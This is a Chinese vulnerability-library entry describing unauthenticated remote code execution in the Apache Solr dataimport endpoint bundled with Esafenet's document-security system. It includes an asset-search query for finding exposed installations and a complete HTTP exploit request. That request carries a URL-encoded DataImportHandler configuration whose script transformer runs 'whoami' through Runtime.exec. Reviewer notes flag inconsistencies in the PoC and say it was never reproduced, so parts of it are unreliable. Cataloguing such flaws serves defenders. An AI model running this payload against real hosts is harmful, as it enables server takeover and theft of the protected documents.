---
source: "wy876 漏洞文库"
title: "亿赛通内置Apache Solr flow dataimport脚本远程代码执行"
product: "亿赛通内置Apache Solr"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "固定flow core及DIH/脚本/dataConfig配置，版本未知"
prerequisites: "匿名声称，Solr管理权限未知"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mfo68msf0ufl9qz8"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fsolr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"ESAFENET 亿赛通文档安全管理系统\""
id: "vw-078896f716d2788ba388a062"
entity_id: "ve-078896f716d2788ba388a062"
schema_version: "1"
---

# 亿赛通内置Apache Solr flow dataimport脚本远程代码执行

## 条目说明

- 对象与具体问题：亿赛通内置Apache Solr；flow dataimport脚本RCE
- 版本、配置及部署条件：固定flow core及DIH/脚本/dataConfig配置，版本未知
- 认证与权限前提：匿名声称，Solr管理权限未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同streamsrc声明与streamsrc1引用不一致，core=tika也与flow不一致需核
- 裸RDF正文未Content-Type/stream.body，是否被ContentStreamDataSource接受需原始实验依据
- 仅说出现如下情况却无返回，端点可达不等于漏洞；缺修复及产品组件映射

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统/solr/flow/dataimport接口处存在远程代码执行漏洞，未经授权的攻击者可通过此漏洞执行任意指令，从而获取服务器权限。

## 二、影响版本
+ 亿赛通电子文档安全管理系统

## 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


## 四、漏洞复现
1. 访问以下POC，出现如下情况表达可能存在漏洞

```plain
/solr/flow/dataimport
```


2. 通过exp执行命令

```http
POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 83

<?xml version="1.0" encoding="UTF-8"?>
        <RDF>
        <item/>
        </RDF>
```

> 请求长度说明：原资料 Content-Length 为 83；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mfo68msf0ufl9qz8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
